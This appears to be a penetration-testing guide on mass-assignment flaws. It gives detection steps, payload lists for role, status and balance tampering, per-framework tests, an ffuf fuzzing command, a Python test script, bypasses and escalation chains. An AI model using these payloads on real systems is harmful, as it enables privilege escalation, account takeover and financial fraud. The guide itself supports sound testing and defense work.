# Mass Assignment

> **Summary**: Mass assignment (CWE-915) occurs when an application automatically binds user-supplied input to internal model properties without an explicit allow-list, enabling attackers to modify privileged fields such as roles, permissions, or account status.
> **Impact**: Vertical privilege escalation (user to admin), horizontal privilege escalation, account takeover, financial manipulation (balance/credits/price tampering), bypassing business logic restrictions.
> **Typical Severity**: High | Critical

## Detection

### Indicators
- API endpoints that accept JSON/form data for user profile updates (`PUT /api/users/<ID>`, `PATCH /me`, `POST /api/register`)
- Response bodies that echo server-managed fields not present in the original request (e.g., `roles`, `isAdmin`, `status`, `verified`, `permissions`)
- Client-side JavaScript bundles containing role names, permission constants, or DTO/model schemas
- API documentation (Swagger/OpenAPI) exposing internal model properties
- Frameworks known for auto-binding: Rails, Laravel, Django, Spring Boot, Express/Mongoose, Sequelize

### Automated Detection

#### Param Miner (Burp Suite)
```
Right-click request -> Extensions -> Param Miner -> Guess body params
```

#### Arjun -- Parameter Discovery
```bash
arjun -u https://<TARGET>/api/users/<ID> -m PUT -o params.json
```

#### Manual Grep on JS Bundles
```bash
# Download and search client JS for model/role hints
curl -s https://<TARGET>/static/js/app.js | grep -iE "role|admin|isAdmin|permission|status|verified|balance|credits" | sort -u
```

### Manual Detection
1. **Baseline request**: send a normal update with only safe fields and observe the full JSON response structure
   ```http
   PUT /api/users/<YOUR_ID> HTTP/1.1
   Host: <TARGET>
   Content-Type: application/json
   Authorization: Bearer <TOKEN>

   {"firstName": "Test", "lastName": "User"}
   ```
2. **Inspect response**: look for fields you did not send -- `roles`, `isAdmin`, `status`, `verified`, `balance`, `organization_id`, `permissions`
3. **Inject privileged field**: repeat the request including a discovered privileged field
   ```http
   PUT /api/users/<YOUR_ID> HTTP/1.1
   Host: <TARGET>
   Content-Type: application/json
   Authorization: Bearer <TOKEN>

   {"firstName": "Test", "lastName": "User", "role": "admin"}
   ```
4. **Success criteria**: if the response persists the change (field value updated), mass assignment is confirmed
5. **Compare GET vs PUT/POST**: compare fields returned by `GET /api/users/<ID>` with the fields accepted in `PUT`/`POST` bodies -- any overlap with privileged fields is a target

## Exploitation

### Prerequisites
- An authenticated account on the target application
- Identified endpoints that accept user input for object creation or update
- Knowledge of internal model properties (from response inspection, JS bundles, API docs, or guessing)

### Step-by-Step

1. **Enumerate the schema** -- Send a legitimate update and inspect the full response to map all properties of the model
   - **Success criteria**: response contains fields beyond what you submitted (e.g., `roles: null`, `isAdmin: false`)

2. **Identify candidate fields** -- Test common privileged parameter names one at a time:
   - `role`, `roles`, `isAdmin`, `is_admin`, `admin`, `is_staff`, `userType`, `user_type`
   - `verified`, `email_verified`, `is_verified`, `active`, `is_active`, `status`
   - `balance`, `credits`, `discount`, `price`, `amount`
   - `user_id`, `organization_id`, `tenant_id`, `group_id`
   - `permissions`, `scope`, `entitlements`, `features`
   - **Success criteria**: server accepts the field without returning a 400/422 error

3. **Escalate privileges** -- Inject the confirmed privileged field with the desired value:
   ```http
   PUT /api/users/<YOUR_ID> HTTP/1.1
   Host: <TARGET>
   Content-Type: application/json
   Authorization: Bearer <TOKEN>

   {
     "firstName": "Test",
     "roles": [{"id": 1, "name": "ADMIN"}]
   }
   ```
   - **Success criteria**: response confirms the role change; re-authenticate or refresh token to confirm elevated access

4. **Verify escalation** -- Access admin-only endpoints or UI sections after re-authentication
   - **Success criteria**: previously forbidden resources (403) now return 200

### Payloads

#### Role Escalation
```json
{"role": "admin"}
{"roles": ["admin"]}
{"roles": [{"id": 1, "name": "ADMIN"}]}
{"isAdmin": true}
{"is_admin": true}
{"is_staff": true}
{"userType": "administrator"}
{"permissions": ["*"]}
{"access_level": 9999}
```

#### Account Status Manipulation
```json
{"verified": true}
{"email_verified": true}
{"is_active": true}
{"status": "ACTIVATED"}
{"account_status": "premium"}
```

#### Financial Manipulation
```json
{"balance": 99999}
{"credits": 99999}
{"discount": 100}
{"price": 0}
{"amount": 0.01}
```

#### IDOR via Mass Assignment
```json
{"user_id": "<VICTIM_ID>"}
{"organization_id": "<TARGET_ORG_ID>"}
{"owner_id": "<ATTACKER_ID>"}
{"tenant_id": "<OTHER_TENANT>"}
```

#### Nested Object Injection
```json
{"user": {"role": "admin"}}
{"profile": {"is_admin": true}}
{"account": {"balance": 99999, "verified": true}}
```

#### Array Parameter Injection
```json
{"roles": ["user", "admin"]}
{"permissions": ["read", "write", "delete", "admin"]}
```

#### JSON vs Form-Data Differences
Some backends parse `application/json` and `application/x-www-form-urlencoded` differently. Test both:
```
# Form-encoded
role=admin&verified=true

# JSON
{"role": "admin", "verified": true}

# Nested form-encoded (PHP/Rails)
user[role]=admin
user[is_admin]=true
```

### Exploitation by Framework

#### Ruby on Rails
- Vulnerable when `params[:user]` is passed directly to `update` or `create` without strong parameters
- Test: add `admin=true` or `role=admin` to the request body
- Legacy apps using `attr_accessible` (pre-Rails 4) instead of `strong_parameters` are especially vulnerable
```
# Rails strong params bypass attempt -- try dot notation
user.admin=true
user[admin]=true
```

#### Node.js / Express (Mongoose/Sequelize)
- Vulnerable when `req.body` is passed directly to `Model.findByIdAndUpdate()` or `Model.create()`
- Test: include `isAdmin`, `role`, or `verified` in JSON body
```json
{"username": "test", "isAdmin": true}
```

#### Django / Python
- Vulnerable when using `ModelForm` without explicit `fields` or `exclude` definitions
- Test: add model fields not exposed in the form (e.g., `is_staff`, `is_superuser`)
```json
{"username": "test", "is_staff": true, "is_superuser": true}
```

#### Java / Spring Boot
- Vulnerable when `@RequestBody` maps directly to JPA entity without a DTO
- Test: include entity fields like `roles`, `enabled`, `authorities`
```json
{"username": "test", "authorities": [{"authority": "ROLE_ADMIN"}]}
```

#### PHP / Laravel (Eloquent)
- Vulnerable when `$guarded = []` (empty guarded array) or `$fillable` includes privileged fields
- Test: submit fields like `is_admin`, `role`, `email_verified_at`
```json
{"name": "test", "is_admin": 1, "email_verified_at": "2024-01-01 00:00:00"}
```

### Proof of Concept

#### Automated Parameter Fuzzing with ffuf
```bash
# Generate a wordlist of common privileged parameters
cat << 'EOF' > mass-assign-params.txt
role
roles
isAdmin
is_admin
admin
is_staff
userType
verified
email_verified
is_active
status
balance
credits
discount
permissions
organization_id
user_id
owner_id
EOF

# Fuzz each parameter name against the update endpoint
ffuf -u https://<TARGET>/api/users/<ID> \
  -X PUT \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"firstName":"Test","FUZZ":true}' \
  -w mass-assign-params.txt \
  -fc 400,422 \
  -mc all
```

#### Python Script -- Automated Mass Assignment Test
```python
import requests

url = "https://<TARGET>/api/users/<YOUR_ID>"
headers = {
    "Authorization": "Bearer <TOKEN>",
    "Content-Type": "application/json"
}

params_to_test = [
    {"role": "admin"}, {"isAdmin": True}, {"is_admin": True},
    {"is_staff": True}, {"verified": True}, {"status": "ACTIVATED"},
    {"balance": 99999}, {"permissions": ["admin"]},
    {"user_type": "administrator"}, {"email_verified": True}
]

for param in params_to_test:
    payload = {"firstName": "Test"}
    payload.update(param)
    r = requests.put(url, json=payload, headers=headers)
    key = list(param.keys())[0]
    if r.status_code == 200 and key in r.text:
        print(f"[+] Potentially vulnerable to: {param}")
        print(f"    Response: {r.text[:200]}")
```

## Bypasses

- **Content-Type switching**: if `application/json` is blocked, try `application/x-www-form-urlencoded` or `multipart/form-data`
- **Nested parameters**: `{"user": {"role": "admin"}}` instead of `{"role": "admin"}`
- **Dot notation**: `user.role=admin` in form-encoded requests
- **Array wrapping**: `{"role": ["admin"]}` instead of `{"role": "admin"}`
- **Different HTTP methods**: `PATCH` may bind differently than `PUT`
- **Registration endpoint**: mass assignment on `/api/register` or `/api/signup` is often less protected than `/api/users/<ID>`
- **Alternate endpoints**: try legacy or versioned endpoints (`/v1/users/<ID>`, `/api/internal/users/<ID>`)
- **Case variation**: `isAdmin` vs `is_admin` vs `IsAdmin` vs `ISADMIN`
- **Type juggling**: send `"true"` (string), `1` (integer), `"1"` (string), `true` (boolean) for boolean fields
- **Merge via PUT vs PATCH**: PUT often replaces the entire object (including defaults); PATCH only updates sent fields -- test both
- **Batch/bulk endpoints**: `/api/users/bulk-update` may skip per-field validation

## Escalation

- Chain with [IDOR](idor.md): use mass assignment to change `owner_id` or `organization_id` to access other users' resources
- Chain with [Parameter Pollution](parameter-pollution.md): combine duplicate parameters with mass assignment for filter bypass
- Chain with registration flows: inject `role=admin` during account creation to get immediate admin access (see [Registration Vulns](../authentication/registration-vulns.md))
- **Token refresh**: after successful role escalation, re-authenticate to obtain a new session/JWT with elevated claims
- **Data exfiltration**: after escalating to admin, access admin-only API endpoints to extract sensitive data
- **Financial fraud**: manipulate `balance`, `credits`, or `price` fields for monetary gain

## Tools

| Tool | Usage |
|------|-------|
| [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Burp extension: brute-force hidden parameters in request bodies |
| [Arjun](https://github.com/s0md3v/Arjun) | CLI parameter discovery across GET/POST/PUT/PATCH |
| [ffuf](https://github.com/ffuf/ffuf) | Fast fuzzer for parameter name brute-forcing |
| Burp Intruder | Fuzz parameter names and values against update endpoints |
| [mass-assignment-scanner](https://github.com/BishopFox/mass-assignment-scanner) | Automated mass assignment vulnerability scanner |
| Browser DevTools | Inspect JS bundles for model schemas and role constants |

## References
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [OWASP API Security - API6:2023 Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/)
- [PortSwigger - Mass Assignment Vulnerabilities](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)
- [HackTricks - Mass Assignment](https://book.hacktricks.wiki/en/pentesting-web/mass-assignment-cwe-915.html)
- [FIA Driver Categorisation: Admin Takeover via Mass Assignment (Ian Sh)](https://ian.sh/fia)
